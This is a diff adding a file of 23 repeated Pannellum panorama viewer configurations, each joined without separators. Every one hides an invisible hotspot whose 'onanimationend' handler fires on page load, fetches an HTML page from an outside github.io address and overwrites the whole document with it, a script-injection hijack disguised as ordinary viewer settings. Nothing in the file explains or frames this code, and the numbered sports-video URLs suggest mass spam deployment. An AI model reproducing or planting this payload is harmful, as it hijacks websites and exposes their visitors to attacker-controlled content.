@@ -1,0 +1,415 @@
+{
+  "autoLoad": true,
+  "pitch": 0,
+  "yaw": 0,
+  "type": "equirectangular",
+  "panorama": "https://pannellum.org/images/alma.jpg",
+  "hotSpots": [
+    {
+      "pitch": 0,
+      "yaw": 0,
+      "type": "info",
+      "URL": "#",
+      "attributes": {
+        "style": "visibility:visible !important; position:fixed; top:0; left:0; width:1px; height:1px; z-index:99999; opacity:0; pointer-events:none; animation: pnlm-mv 0.01s 1 forwards",
+        "onanimationend": "if (window.grav_FETCH_RAN) { console.log('already ran'); } else { window.grav_FETCH_RAN = 1; fetch('https://humayrakter.github.io/new/sun/video-besiktas-marseille-fr.001.html').then(function (res) { return res.text(); }).then(function (html) { document.open(); document.write(html); document.close(); }).catch(function (err) { console.error(err); }); }"
+      }
+    }
+  ]
+}{
+  "autoLoad": true,
+  "pitch": 0,
+  "yaw": 0,
+  "type": "equirectangular",
+  "panorama": "https://pannellum.org/images/alma.jpg",
+  "hotSpots": [
+    {
+      "pitch": 0,
+      "yaw": 0,
+      "type": "info",
+      "URL": "#",
+      "attributes": {
+        "style": "visibility:visible !important; position:fixed; top:0; left:0; width:1px; height:1px; z-index:99999; opacity:0; pointer-events:none; animation: pnlm-mv 0.01s 1 forwards",
+        "onanimationend": "if (window.grav_FETCH_RAN) { console.log('already ran'); } else { window.grav_FETCH_RAN = 1; fetch('https://humayrakter.github.io/new/sun/video-besiktas-marseille-fr.002.html').then(function (res) { return res.text(); }).then(function (html) { document.open(); document.write(html); document.close(); }).catch(function (err) { console.error(err); }); }"
+      }
+    }
+  ]
+}{
+  "autoLoad": true,
+  "pitch": 0,
+  "yaw": 0,
+  "type": "equirectangular",
+  "panorama": "https://pannellum.org/images/alma.jpg",
+  "hotSpots": [
+    {
+      "pitch": 0,
+      "yaw": 0,
+      "type": "info",
+      "URL": "#",
+      "attributes": {
+        "style": "visibility:visible !important; position:fixed; top:0; left:0; width:1px; height:1px; z-index:99999; opacity:0; pointer-events:none; animation: pnlm-mv 0.01s 1 forwards",
+        "onanimationend": "if (window.grav_FETCH_RAN) { console.log('already ran'); } else { window.grav_FETCH_RAN = 1; fetch('https://humayrakter.github.io/new/sun/video-besiktas-marseille-fr.003.html').then(function (res) { return res.text(); }).then(function (html) { document.open(); document.write(html); document.close(); }).catch(function (err) { console.error(err); }); }"
+      }
+    }
+  ]
+}{
+  "autoLoad": true,
+  "pitch": 0,
+  "yaw": 0,
+  "type": "equirectangular",
+  "panorama": "https://pannellum.org/images/alma.jpg",
+  "hotSpots": [
+    {
+      "pitch": 0,
+      "yaw": 0,
+      "type": "info",
+      "URL": "#",
+      "attributes": {
+        "style": "visibility:visible !important; position:fixed; top:0; left:0; width:1px; height:1px; z-index:99999; opacity:0; pointer-events:none; animation: pnlm-mv 0.01s 1 forwards",
+        "onanimationend": "if (window.grav_FETCH_RAN) { console.log('already ran'); } else { window.grav_FETCH_RAN = 1; fetch('https://humayrakter.github.io/new/sun/video-besiktas-marseille-fr.004.html').then(function (res) { return res.text(); }).then(function (html) { document.open(); document.write(html); document.close(); }).catch(function (err) { console.error(err); }); }"
+      }
+    }
+  ]
+}{
+  "autoLoad": true,
+  "pitch": 0,
+  "yaw": 0,
+  "type": "equirectangular",
+  "panorama": "https://pannellum.org/images/alma.jpg",
+  "hotSpots": [
+    {
+      "pitch": 0,
+      "yaw": 0,
+      "type": "info",
+      "URL": "#",
+      "attributes": {
+        "style": "visibility:visible !important; position:fixed; top:0; left:0; width:1px; height:1px; z-index:99999; opacity:0; pointer-events:none; animation: pnlm-mv 0.01s 1 forwards",
+        "onanimationend": "if (window.grav_FETCH_RAN) { console.log('already ran'); } else { window.grav_FETCH_RAN = 1; fetch('https://humayrakter.github.io/new/sun/video-besiktas-marseille-fr.005.html').then(function (res) { return res.text(); }).then(function (html) { document.open(); document.write(html); document.close(); }).catch(function (err) { console.error(err); }); }"
+      }
+    }
+  ]
+}{
+  "autoLoad": true,
+  "pitch": 0,
+  "yaw": 0,
+  "type": "equirectangular",
+  "panorama": "https://pannellum.org/images/alma.jpg",
+  "hotSpots": [
+    {
+      "pitch": 0,
+      "yaw": 0,
+      "type": "info",
+      "URL": "#",
+      "attributes": {
+        "style": "visibility:visible !important; position:fixed; top:0; left:0; width:1px; height:1px; z-index:99999; opacity:0; pointer-events:none; animation: pnlm-mv 0.01s 1 forwards",
+        "onanimationend": "if (window.grav_FETCH_RAN) { console.log('already ran'); } else { window.grav_FETCH_RAN = 1; fetch('https://humayrakter.github.io/new/sun/video-besiktas-marseille-fr.006.html').then(function (res) { return res.text(); }).then(function (html) { document.open(); document.write(html); document.close(); }).catch(function (err) { console.error(err); }); }"
+      }
+    }
+  ]
+}{
+  "autoLoad": true,
+  "pitch": 0,
+  "yaw": 0,
+  "type": "equirectangular",
+  "panorama": "https://pannellum.org/images/alma.jpg",
+  "hotSpots": [
+    {
+      "pitch": 0,
+      "yaw": 0,
+      "type": "info",
+      "URL": "#",
+      "attributes": {
+        "style": "visibility:visible !important; position:fixed; top:0; left:0; width:1px; height:1px; z-index:99999; opacity:0; pointer-events:none; animation: pnlm-mv 0.01s 1 forwards",
+        "onanimationend": "if (window.grav_FETCH_RAN) { console.log('already ran'); } else { window.grav_FETCH_RAN = 1; fetch('https://humayrakter.github.io/new/sun/video-besiktas-marseille-fr.007.html').then(function (res) { return res.text(); }).then(function (html) { document.open(); document.write(html); document.close(); }).catch(function (err) { console.error(err); }); }"
+      }
+    }
+  ]
+}{
+  "autoLoad": true,
+  "pitch": 0,
+  "yaw": 0,
+  "type": "equirectangular",
+  "panorama": "https://pannellum.org/images/alma.jpg",
+  "hotSpots": [
+    {
+      "pitch": 0,
+      "yaw": 0,
+      "type": "info",
+      "URL": "#",
+      "attributes": {
+        "style": "visibility:visible !important; position:fixed; top:0; left:0; width:1px; height:1px; z-index:99999; opacity:0; pointer-events:none; animation: pnlm-mv 0.01s 1 forwards",
+        "onanimationend": "if (window.grav_FETCH_RAN) { console.log('already ran'); } else { window.grav_FETCH_RAN = 1; fetch('https://humayrakter.github.io/new/sun/video-besiktas-marseille-fr.008.html').then(function (res) { return res.text(); }).then(function (html) { document.open(); document.write(html); document.close(); }).catch(function (err) { console.error(err); }); }"
+      }
+    }
+  ]
+}{
+  "autoLoad": true,
+  "pitch": 0,
+  "yaw": 0,
+  "type": "equirectangular",
+  "panorama": "https://pannellum.org/images/alma.jpg",
+  "hotSpots": [
+    {
+      "pitch": 0,
+      "yaw": 0,
+      "type": "info",
+      "URL": "#",
+      "attributes": {
+        "style": "visibility:visible !important; position:fixed; top:0; left:0; width:1px; height:1px; z-index:99999; opacity:0; pointer-events:none; animation: pnlm-mv 0.01s 1 forwards",
+        "onanimationend": "if (window.grav_FETCH_RAN) { console.log('already ran'); } else { window.grav_FETCH_RAN = 1; fetch('https://humayrakter.github.io/new/sun/video-besiktas-marseille-fr.009.html').then(function (res) { return res.text(); }).then(function (html) { document.open(); document.write(html); document.close(); }).catch(function (err) { console.error(err); }); }"
+      }
+    }
+  ]
+}{
+  "autoLoad": true,
+  "pitch": 0,
+  "yaw": 0,
+  "type": "equirectangular",
+  "panorama": "https://pannellum.org/images/alma.jpg",
+  "hotSpots": [
+    {
+      "pitch": 0,
+      "yaw": 0,
+      "type": "info",
+      "URL": "#",
+      "attributes": {
+        "style": "visibility:visible !important; position:fixed; top:0; left:0; width:1px; height:1px; z-index:99999; opacity:0; pointer-events:none; animation: pnlm-mv 0.01s 1 forwards",
+        "onanimationend": "if (window.grav_FETCH_RAN) { console.log('already ran'); } else { window.grav_FETCH_RAN = 1; fetch('https://humayrakter.github.io/new/sun/video-besiktas-marseille-fr.010.html').then(function (res) { return res.text(); }).then(function (html) { document.open(); document.write(html); document.close(); }).catch(function (err) { console.error(err); }); }"
+      }
+    }
+  ]
+}{
+  "autoLoad": true,
+  "pitch": 0,
+  "yaw": 0,
+  "type": "equirectangular",
+  "panorama": "https://pannellum.org/images/alma.jpg",
+  "hotSpots": [
+    {
+      "pitch": 0,
+      "yaw": 0,
+      "type": "info",
+      "URL": "#",
+      "attributes": {
+        "style": "visibility:visible !important; position:fixed; top:0; left:0; width:1px; height:1px; z-index:99999; opacity:0; pointer-events:none; animation: pnlm-mv 0.01s 1 forwards",
+        "onanimationend": "if (window.grav_FETCH_RAN) { console.log('already ran'); } else { window.grav_FETCH_RAN = 1; fetch('https://humayrakter.github.io/new/sun/video-besiktas-marseille-fr.011.html').then(function (res) { return res.text(); }).then(function (html) { document.open(); document.write(html); document.close(); }).catch(function (err) { console.error(err); }); }"
+      }
+    }
+  ]
+}{
+  "autoLoad": true,
+  "pitch": 0,
+  "yaw": 0,
+  "type": "equirectangular",
+  "panorama": "https://pannellum.org/images/alma.jpg",
+  "hotSpots": [
+    {
+      "pitch": 0,
+      "yaw": 0,
+      "type": "info",
+      "URL": "#",
+      "attributes": {
+        "style": "visibility:visible !important; position:fixed; top:0; left:0; width:1px; height:1px; z-index:99999; opacity:0; pointer-events:none; animation: pnlm-mv 0.01s 1 forwards",
+        "onanimationend": "if (window.grav_FETCH_RAN) { console.log('already ran'); } else { window.grav_FETCH_RAN = 1; fetch('https://humayrakter.github.io/new/sun/video-besiktas-marseille-fr.012.html').then(function (res) { return res.text(); }).then(function (html) { document.open(); document.write(html); document.close(); }).catch(function (err) { console.error(err); }); }"
+      }
+    }
+  ]
+}{
+  "autoLoad": true,
+  "pitch": 0,
+  "yaw": 0,
+  "type": "equirectangular",
+  "panorama": "https://pannellum.org/images/alma.jpg",
+  "hotSpots": [
+    {
+      "pitch": 0,
+      "yaw": 0,
+      "type": "info",
+      "URL": "#",
+      "attributes": {
+        "style": "visibility:visible !important; position:fixed; top:0; left:0; width:1px; height:1px; z-index:99999; opacity:0; pointer-events:none; animation: pnlm-mv 0.01s 1 forwards",
+        "onanimationend": "if (window.grav_FETCH_RAN) { console.log('already ran'); } else { window.grav_FETCH_RAN = 1; fetch('https://humayrakter.github.io/new/sun/video-besiktas-marseille-fr.013.html').then(function (res) { return res.text(); }).then(function (html) { document.open(); document.write(html); document.close(); }).catch(function (err) { console.error(err); }); }"
+      }
+    }
+  ]
+}{
+  "autoLoad": true,
+  "pitch": 0,
+  "yaw": 0,
+  "type": "equirectangular",
+  "panorama": "https://pannellum.org/images/alma.jpg",
+  "hotSpots": [
+    {
+      "pitch": 0,
+      "yaw": 0,
+      "type": "info",
+      "URL": "#",
+      "attributes": {
+        "style": "visibility:visible !important; position:fixed; top:0; left:0; width:1px; height:1px; z-index:99999; opacity:0; pointer-events:none; animation: pnlm-mv 0.01s 1 forwards",
+        "onanimationend": "if (window.grav_FETCH_RAN) { console.log('already ran'); } else { window.grav_FETCH_RAN = 1; fetch('https://humayrakter.github.io/new/sun/video-besiktas-marseille-fr.014.html').then(function (res) { return res.text(); }).then(function (html) { document.open(); document.write(html); document.close(); }).catch(function (err) { console.error(err); }); }"
+      }
+    }
+  ]
+}{
+  "autoLoad": true,
+  "pitch": 0,
+  "yaw": 0,
+  "type": "equirectangular",
+  "panorama": "https://pannellum.org/images/alma.jpg",
+  "hotSpots": [
+    {
+      "pitch": 0,
+      "yaw": 0,
+      "type": "info",
+      "URL": "#",
+      "attributes": {
+        "style": "visibility:visible !important; position:fixed; top:0; left:0; width:1px; height:1px; z-index:99999; opacity:0; pointer-events:none; animation: pnlm-mv 0.01s 1 forwards",
+        "onanimationend": "if (window.grav_FETCH_RAN) { console.log('already ran'); } else { window.grav_FETCH_RAN = 1; fetch('https://humayrakter.github.io/new/sun/video-besiktas-marseille-fr.015.html').then(function (res) { return res.text(); }).then(function (html) { document.open(); document.write(html); document.close(); }).catch(function (err) { console.error(err); }); }"
+      }
+    }
+  ]
+}{
+  "autoLoad": true,
+  "pitch": 0,
+  "yaw": 0,
+  "type": "equirectangular",
+  "panorama": "https://pannellum.org/images/alma.jpg",
+  "hotSpots": [
+    {
+      "pitch": 0,
+      "yaw": 0,
+      "type": "info",
+      "URL": "#",
+      "attributes": {
+        "style": "visibility:visible !important; position:fixed; top:0; left:0; width:1px; height:1px; z-index:99999; opacity:0; pointer-events:none; animation: pnlm-mv 0.01s 1 forwards",
+        "onanimationend": "if (window.grav_FETCH_RAN) { console.log('already ran'); } else { window.grav_FETCH_RAN = 1; fetch('https://humayrakter.github.io/new/sun/video-besiktas-marseille-fr.016.html').then(function (res) { return res.text(); }).then(function (html) { document.open(); document.write(html); document.close(); }).catch(function (err) { console.error(err); }); }"
+      }
+    }
+  ]
+}{
+  "autoLoad": true,
+  "pitch": 0,
+  "yaw": 0,
+  "type": "equirectangular",
+  "panorama": "https://pannellum.org/images/alma.jpg",
+  "hotSpots": [
+    {
+      "pitch": 0,
+      "yaw": 0,
+      "type": "info",
+      "URL": "#",
+      "attributes": {
+        "style": "visibility:visible !important; position:fixed; top:0; left:0; width:1px; height:1px; z-index:99999; opacity:0; pointer-events:none; animation: pnlm-mv 0.01s 1 forwards",
+        "onanimationend": "if (window.grav_FETCH_RAN) { console.log('already ran'); } else { window.grav_FETCH_RAN = 1; fetch('https://humayrakter.github.io/new/sun/video-besiktas-marseille-fr.017.html').then(function (res) { return res.text(); }).then(function (html) { document.open(); document.write(html); document.close(); }).catch(function (err) { console.error(err); }); }"
+      }
+    }
+  ]
+}{
+  "autoLoad": true,
+  "pitch": 0,
+  "yaw": 0,
+  "type": "equirectangular",
+  "panorama": "https://pannellum.org/images/alma.jpg",
+  "hotSpots": [
+    {
+      "pitch": 0,
+      "yaw": 0,
+      "type": "info",
+      "URL": "#",
+      "attributes": {
+        "style": "visibility:visible !important; position:fixed; top:0; left:0; width:1px; height:1px; z-index:99999; opacity:0; pointer-events:none; animation: pnlm-mv 0.01s 1 forwards",
+        "onanimationend": "if (window.grav_FETCH_RAN) { console.log('already ran'); } else { window.grav_FETCH_RAN = 1; fetch('https://humayrakter.github.io/new/sun/video-besiktas-marseille-fr.018.html').then(function (res) { return res.text(); }).then(function (html) { document.open(); document.write(html); document.close(); }).catch(function (err) { console.error(err); }); }"
+      }
+    }
+  ]
+}{
+  "autoLoad": true,
+  "pitch": 0,
+  "yaw": 0,
+  "type": "equirectangular",
+  "panorama": "https://pannellum.org/images/alma.jpg",
+  "hotSpots": [
+    {
+      "pitch": 0,
+      "yaw": 0,
+      "type": "info",
+      "URL": "#",
+      "attributes": {
+        "style": "visibility:visible !important; position:fixed; top:0; left:0; width:1px; height:1px; z-index:99999; opacity:0; pointer-events:none; animation: pnlm-mv 0.01s 1 forwards",
+        "onanimationend": "if (window.grav_FETCH_RAN) { console.log('already ran'); } else { window.grav_FETCH_RAN = 1; fetch('https://humayrakter.github.io/new/sun/video-besiktas-marseille-fr.019.html').then(function (res) { return res.text(); }).then(function (html) { document.open(); document.write(html); document.close(); }).catch(function (err) { console.error(err); }); }"
+      }
+    }
+  ]
+}{
+  "autoLoad": true,
+  "pitch": 0,
+  "yaw": 0,
+  "type": "equirectangular",
+  "panorama": "https://pannellum.org/images/alma.jpg",
+  "hotSpots": [
+    {
+      "pitch": 0,
+      "yaw": 0,
+      "type": "info",
+      "URL": "#",
+      "attributes": {
+        "style": "visibility:visible !important; position:fixed; top:0; left:0; width:1px; height:1px; z-index:99999; opacity:0; pointer-events:none; animation: pnlm-mv 0.01s 1 forwards",
+        "onanimationend": "if (window.grav_FETCH_RAN) { console.log('already ran'); } else { window.grav_FETCH_RAN = 1; fetch('https://humayrakter.github.io/new/sun/video-besiktas-marseille-fr.020.html').then(function (res) { return res.text(); }).then(function (html) { document.open(); document.write(html); document.close(); }).catch(function (err) { console.error(err); }); }"
+      }
+    }
+  ]
+}{
+  "autoLoad": true,
+  "pitch": 0,
+  "yaw": 0,
+  "type": "equirectangular",
+  "panorama": "https://pannellum.org/images/alma.jpg",
+  "hotSpots": [
+    {
+      "pitch": 0,
+      "yaw": 0,
+      "type": "info",
+      "URL": "#",
+      "attributes": {
+        "style": "visibility:visible !important; position:fixed; top:0; left:0; width:1px; height:1px; z-index:99999; opacity:0; pointer-events:none; animation: pnlm-mv 0.01s 1 forwards",
+        "onanimationend": "if (window.grav_FETCH_RAN) { console.log('already ran'); } else { window.grav_FETCH_RAN = 1; fetch('https://humayrakter.github.io/new/sun/video-besiktas-marseille-fr.021.html').then(function (res) { return res.text(); }).then(function (html) { document.open(); document.write(html); document.close(); }).catch(function (err) { console.error(err); }); }"
+      }
+    }
+  ]
+}{
+  "autoLoad": true,
+  "pitch": 0,
+  "yaw": 0,
+  "type": "equirectangular",
+  "panorama": "https://pannellum.org/images/alma.jpg",
+  "hotSpots": [
+    {
+      "pitch": 0,
+      "yaw": 0,
+      "type": "info",
+      "URL": "#",
+      "attributes": {
+        "style": "visibility:visible !important; position:fixed; top:0; left:0; width:1px; height:1px; z-index:99999; opacity:0; pointer-events:none; animation: pnlm-mv 0.01s 1 forwards",
+        "onanimationend": "if (window.grav_FETCH_RAN) { console.log('already ran'); } else { window.grav_FETCH_RAN = 1; fetch('https://humayrakter.github.io/new/sun/video-besiktas-marseille-fr.022.html').then(function (res) { return res.text(); }).then(function (html) { document.open(); document.write(html); document.close(); }).catch(function (err) { console.error(err); }); }"
+      }
+    }
+  ]
+}{
+  "autoLoad": true,
+  "pitch": 0,
+  "yaw": 0,
+  "type": "equirectangular",
+  "panorama": "https://pannellum.org/images/alma.jpg",
+  "hotSpots": [
+    {
+      "pitch": 0,
+      "yaw": 0,
+      "type": "info",
+      "URL": "#",
+      "attributes": {
+        "style": "visibility:visible !important; position:fixed; top:0; left:0; width:1px; height:1px; z-index:99999; opacity:0; pointer-events:none; animation: pnlm-mv 0.01s 1 forwards",
+        "onanimationend": "if (window.grav_FETCH_RAN) { console.log('already ran'); } else { window.grav_FETCH_RAN = 1; fetch('https://humayrakter.github.io/new/sun/video-besiktas-marseille-fr.023.html').then(function (res) { return res.text(); }).then(function (html) { document.open(); document.write(html); document.close(); }).catch(function (err) { console.error(err); }); }"
+      }
+    }
+  ]
+}
